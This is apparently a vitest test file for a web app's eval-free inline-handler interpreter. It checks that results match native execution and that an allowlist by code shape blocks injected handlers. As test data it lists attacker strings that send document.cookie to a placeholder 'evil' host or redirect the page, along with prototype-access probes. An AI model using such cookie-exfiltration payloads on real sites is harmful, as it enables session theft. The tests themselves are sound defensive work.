/* =============================================================================
 * test/handlers_interpreter_test.js — the handler interpreter behaves like the browser does
 * -----------------------------------------------------------------------------
 * wealthflow-handlers.js runs inline-handler text without eval so the page can drop
 * 'unsafe-inline'. Here every snippet is run twice, once by the interpreter and once by
 * the engine itself (`new Function`, which only a test may use), against the same fakes;
 * the calls they make and their results must be identical.
 * ===========================================================================*/

import { describe, it, expect, beforeEach } from 'vitest';
import { parseHandler, handlerShape, runProgram, runAttribute, installHandlers, HandlerError } from '../wealthflow-handlers.js';

let calls;
const rec = (name) => (...a) => { calls.push([name, ...a.map((x) => (typeof x === 'function' ? 'fn' : x))]); return name === 'ret' ? 7 : undefined; };

function world() {
    calls = [];
    const g = {
        closeModal: rec('closeModal'), toggleSetting: rec('toggleSetting'), notify: rec('notify'), triggerHaptic: rec('triggerHaptic'),
        openLoanStatement: rec('openLoanStatement'), setScanSetting: rec('setScanSetting'), _scanSetting: () => true, ret: rec('ret'),
        sendFloatingAI: rec('sendFloatingAI'), WFPeople: { openHub: rec('openHub') }, WFHistory: { open: rec('open') },
        parseInt, parseFloat, window: null, _wfHoldStart: (el, f, ev) => { calls.push(['hold', el.id, typeof f, ev && ev.type]); f(); },
        _undoInvestMonth: rec('_undoInvestMonth'), requestNotificationPermission: () => ({ then: (f) => f('granted') }), renderSettings: rec('renderSettings'),
        document: { getElementById: (id) => ({ id, style: {}, click: rec('click:' + id) }) },
    };
    g.window = g;
    return g;
}
const self = () => ({ id: 'el', value: '42', dataset: {}, src: 'http://x/y.png', closest: () => ({ remove: rec('remove') }) });
const ev = () => ({ type: 'click', key: 'Enter', preventDefault: rec('preventDefault'), stopPropagation: rec('stopPropagation') });

const CORPUS = [
    "closeModal('mdLoan')",
    "closeModal('mdCCOT'); notify('a','b');",
    "toggleSetting('x', this.value)",
    "toggleSetting('x', parseInt(this.value))",
    "toggleSetting('y', parseFloat(this.value)); triggerHaptic('light');",
    "setScanSetting('a', !_scanSetting('a', true))",
    "openLoanStatement('ab\\'c')",
    "openLoanStatement(\"q\\x27r\")",
    "window.WFHistory&&WFHistory.open()",
    "if(window.WFPeople)WFPeople.openHub('x')",
    "if (window.WFHistory) WFHistory.open()",
    "if(event.key==='Enter'){sendFloatingAI();event.preventDefault();}",
    "if(typeof openScannerSettings==='function'){openScannerSettings()}else{notify('no','x')}",
    "if(typeof closeModal==='function'){closeModal('a')}else{notify('no','x')}",
    "window.WFNope?.openReview()",
    "window.WFHistory?.open()",
    "this.dataset.touched='1'",
    "this.dataset.userSet = '1'; document.getElementById('lbl').style.display='none'; closeModal('z');",
    "document.getElementById('box').click()",
    "this.closest('.row').remove()",
    "_wfHoldStart(this,function(){_undoInvestMonth('a','b')},event)",
    "requestNotificationPermission().then(r=>{notify(r === 'granted' ? 'yes' : 'no','t'); renderSettings();})",
    "return false;",
    "event.stopPropagation(); closeModal('k')",
    "x.y = 1",
    "ret() + 1 > 7 ? notify('big') : notify('small')",
    "a = 5; notify(a)",
];

describe('the interpreter equals the engine on every shape the page uses', () => {
    for (const code of CORPUS) {
        it(code, () => {
            const run = (how) => {
                const g = world(); const s = self(); const e = ev();
                let result; let threw = null;
                try {
                    if (how === 'native') {
                        const names = Object.keys(g);
                        const fn = new Function(...names, 'event', code);   // eslint-disable-line no-new-func -- the reference, in a test only
                        result = fn.apply(s, [...names.map((n) => g[n]), e]);
                    } else {
                        result = runProgram(parseHandler(code), { self: s, event: e, root: g });
                    }
                } catch (err) { threw = err.constructor.name; }
                return { calls, result, threw, dataset: s.dataset };
            };
            const native = run('native');
            const mine = run('mine');
            expect(mine.threw).toBe(native.threw);
            expect(mine.calls).toEqual(native.calls);
            expect(mine.result).toBe(native.result);
            expect(mine.dataset).toEqual(native.dataset);
        });
    }
});

describe('shape: what may run', () => {
    it('blanks literals and keeps the program', () => {
        expect(handlerShape("closeModal('mdLoan')")).toBe('closeModal(S)');
        expect(handlerShape("closeModal('other')")).toBe('closeModal(S)');
        expect(handlerShape("toggleSetting('a', this.value); x(3)")).toBe('toggleSetting(S,this.value);x(N)');
        expect(handlerShape("if(event.key==='Enter'){go()}")).toBe('if((event.key===S)){go()}');
    });
    it('gives attacker text a different shape from the app text', () => {
        const shipped = new Set([handlerShape("closeModal('a')")]);
        for (const evil of ["fetch('//evil/'+document.cookie)", "closeModal('a');fetch('//e')", "eval('1')", "closeModal('a'+document.cookie)", "window.location='//evil'"]) {
            expect(shipped.has(handlerShape(evil)), evil).toBe(false);
        }
    });
    it('rejects what it cannot parse instead of guessing', () => {
        for (const x of ['', 'a b', 'foo(', '/* c */ a()', 'a.constructor("x")()', '`t`', 'x = ', '@']) {
            let ok = true; try { const a = parseHandler(x); runProgram(a, { self: {}, event: {}, root: { a: { }, x: 0 } }); } catch (e) { ok = e instanceof HandlerError ? false : false; }
            expect(ok, x).toBe(false);
        }
    });
    it('never reaches constructor, __proto__ or prototype', () => {
        for (const x of ["this.constructor('x')", "a.__proto__.x = 1", "a['constructor']"]) {
            expect(() => runProgram(parseHandler(x), { self: {}, event: {}, root: { a: {} } }), x).toThrow(HandlerError);
        }
    });
});

describe('attributes and the delegating listener', () => {
    function fakeDoc() {
        const handlers = {};
        return { handlers, addEventListener: (t, f) => { handlers[t] = f; }, removeEventListener: () => {} };
    }
    const node = (attrs, parent = null) => ({ nodeType: 1, parentElement: parent, hasAttribute: (k) => k in attrs, getAttribute: (k) => (k in attrs ? attrs[k] : null) });

    it('runs an allowed value, refuses another, and reports a throw without stopping', () => {
        const g = world();
        const allowed = new Set([handlerShape("closeModal('a')")]);
        expect(runAttribute(node({ 'data-wf-on-click': "closeModal('zz')" }), 'click', ev(), allowed, g)).toBe('ran');
        expect(calls).toEqual([['closeModal', 'zz']]);
        expect(runAttribute(node({ 'data-wf-on-click': "notify('x')" }), 'click', ev(), allowed, g)).toBe('refused');
        expect(runAttribute(node({ 'data-wf-on-click': "closeModal('a')" }), 'blur', ev(), allowed, g)).toBe('none');
        const boom = new Set([handlerShape('missing()')]);
        expect(runAttribute(node({ 'data-wf-on-click': 'missing()' }), 'click', ev(), boom, g)).toBe('failed');
    });

    it('return false cancels the default action, like an inline handler', () => {
        const g = world(); const e = ev();
        runAttribute(node({ 'data-wf-on-click': 'return false' }), 'click', e, new Set([handlerShape('return false')]), g);
        expect(calls).toEqual([['preventDefault']]);
    });

    it('walks up from the target in bubbling order and stops at stopPropagation', () => {
        const g = world();
        const allowed = new Set([handlerShape("closeModal('a')"), handlerShape("event.stopPropagation(); closeModal('b')")]);
        const outer = node({ 'data-wf-on-click': "closeModal('outer')" });
        const mid = node({ 'data-wf-on-click': "event.stopPropagation(); closeModal('mid')" }, outer);
        const inner = node({ 'data-wf-on-click': "closeModal('inner')" }, mid);
        const doc = fakeDoc();
        installHandlers(doc, allowed, g);
        const e = { type: 'click', target: inner, cancelBubble: false, stopPropagation() { this.cancelBubble = true; } };
        doc.handlers.click(e);
        expect(calls.map((c) => c[1])).toEqual(['inner', 'mid']);   // outer is not reached
    });
});
